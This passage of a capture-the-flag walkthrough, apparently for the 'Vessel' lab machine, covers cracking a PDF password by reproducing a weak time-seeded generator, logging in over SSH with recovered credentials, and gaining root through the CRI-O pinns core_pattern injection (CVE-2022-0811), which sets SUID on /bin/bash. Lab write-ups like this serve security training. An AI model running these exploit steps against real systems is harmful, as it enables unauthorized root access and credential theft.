        self.textBrowser_5.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:16pt;">characters</span></p></body></html>', None))
        self.password_field.setText('')


class MainWindow(QMainWindow, Ui_MainWindow):

    def __init__(self):
        super(MainWindow, self).__init__()
        self.setupUi(self)
        self.setFixedSize(QSize(550, 400))
        self.setWindowTitle('Secure Password Generator')
        self.password_field.setReadOnly(True)
        self.passlen()
        self.chars()
        self.hide()
        self.gen()

    def passlen(self):
        self.PasswordLength.valueChanged.connect(self.lenpass)

    def lenpass(self, l):
        global value
        value = l

    def chars(self):
        self.comboBox.currentIndexChanged.connect(self.charss)

    def charss(self, i):
        global index
        index = i

    def hide(self):
        self.checkBox.stateChanged.connect(self.status)

    def status(self, s):
        global status
        status = s == Qt.Checked

    def copy(self):
        self.copyButton.clicked.connect(self.copied)

    def copied(self):
        pyperclip.copy(self.password_field.text())

    def gen(self):
        self.generate.clicked.connect(self.genButton)

    def genButton(self):
        try:
            hide = status
            if hide:
                self.password_field.setEchoMode(QLineEdit.Password)
            else:
                self.password_field.setEchoMode(QLineEdit.Normal)
            password = self.genPassword()
            self.password_field.setText(password)
        except:
            msg = QMessageBox()
            msg.setWindowTitle('Warning')
            msg.setText('Change the default values before generating passwords!')
            x = msg.exec_()

        self.copy()

    def genPassword(self):
        length = value
        char = index
        if char == 0:
            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
        else:
            if char == 1:
                charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
            else:
                if char == 2:
                    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
                else:
                    try:
                        qsrand(QTime.currentTime().msec())
                        password = ''
                        for i in range(length):
                            idx = qrand() % len(charset)
                            nchar = charset[idx]
                            password += str(nchar)

                    except:
                        msg = QMessageBox()
                        msg.setWindowTitle('Error')
                        msg.setText('Error while generating password!, Send a message to the Author!')
                        x = msg.exec_()

                return password


if __name__ == '__main__':
    app = QtWidgets.QApplication()
    mainwindow = MainWindow()
    mainwindow.show()
    app.exec_()
# okay decompiling passwordGenerator.pyc
```

- Now you could `pip`  install `PySide2` and attempt in your `docker` container, but this will fail. You need to spin up a `windows vm` since it is a `portable executable` i.e. `x86` system or `windows x32`.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315080721.png)

- I spun up a base instance of a `flare-vm` I have.
- Here is the relevant `python3.7` download:

```bash
https://www.python.org/ftp/python/3.7.0/python-3.7.0.exe
```

- After transferring the relevant `from_vessel` directory I had a go at cracking the password.
- First up generating the possibilities.
- Here is the code as `gen.py`:

```python
from PySide2.QtCore import *


def genPassword():
    length = 32
    char = 0
    if char == 0:
        charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
    else:
        if char == 1:
            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        else:
            if char == 2:
                charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
            else:
                pass
    try:
        qsrand(QTime.currentTime().msec())
        password = ''
        for i in range(length):
            idx = qrand() % len(charset)
            nchar = charset[idx]
            password += str(nchar)
    except:
        print('error')
    return password


def get_me_creds():
    final = []
    try:
        while True:
            gen = genPassword()
            if gen not in final:
                final.append(gen)
                with open('pass.txt', 'a') as f:
                    f.write(gen + '\n')
                print(len(final))
    except KeyboardInterrupt:
        print('See ya!')

get_me_creds()
```

- It will append the relevant password to `final` followed by `appending` the results to the `pass.txt` file. It goes up to `1000` and expects to be interrupted by `Ctrl+C`.
- After completing this task I send it over to my other `vm` to attempt to crack the password:

```bash
cp pass.txt Z:\
```

- On `kali`:

```bash
pdfcrack -f from_vessel/notes.pdf -w pass.txt

PDF version 1.6
Security Handler: Standard
V: 2
R: 3
P: -1028
Length: 128
Encrypted Metadata: True
FileID: c19b3bb1183870f00d63a766a1f80e68
U: 4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000
O: cf30caf66ccc3eabfaf371623215bb8f004d7b8581d68691ca7b800345bc9a86
found user-password: 'YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS'
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315082154.png)

- Open the password protected `notes.pdf`

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315051203.png)

- User number 2 `ethan`!!

```bash
ssh ethan@vessel.htb
Password:b@mPRNSVTjjLKId1T
```

- We can immediately grab the `user.txt` flag:

```bash
cat user.txt 

de04333bca7237099ecb986c0e624ff8
```

- If you were paying attention and you checked the `SUID` bits for `www-data` you would've noticed `/usr/bin/pinns` which was unusual to see:

```bash
find / -perm /4000 -print 2>/dev/null
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315082401.png)

- GoogleFu:
	- `pinns exploit`
		- [[https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/]]

```bash
ssh ethan@vessel.htb
Password:b@mPRNSVTjjLKId1T
cd /tmp
mkdir test; cd test
runc spec --rootless
vim config.json
Add: (within "mounts" section)

{
	"type": "bind",
	"source": "/",
	"destination": "/",
	"options": [
		"rbind",
		"rw",
		"rprivate"
	]
},
mkdir rootfs
echo -e '#!/bin/bash\nchmod +s /bin/bash' > levelup.sh
chmod +x levelup.sh
runc --root /tmp/test run alpine
cat /etc/machine-id
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315083018.png)

- second ssh shell:

```bassh
ssh ethan@vessel.htb
Password:b@mPRNSVTjjLKId1T
/usr/bin/pinns -d /var/run -f 4a55e103ce9f496c973bcdec158a04fd -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/test/levelup.sh #' --ipc --net --uts --cgroup
```

- Back to initial docker container:

```bash
ulimit -c unlimited
ulimit -c
bash -i
tail -f /dev/null &
kill -SIGSEGV <pid of tail>
ps
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315084008.png)

- Check on the other shell and voila!

```bash
ls -ld /bin/bash
/bin/bash -p
cat user.txt 

4b06813ee93e781848d6af60135442bb

cat /root/root.txt 

f3ddff95cf3ec9fd9bf52bceca7c61e5
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315084042.png)

- Bonus! If you were wondering where all of the `.sh` files were going you could've gotten away with having +2 nested directories with the `.sh` files.
- Until next time 🫡
- Happy hacking!

![image](https://0xc0rvu5.github.io/docs/assets/images/20230315063417.png)

#hacking
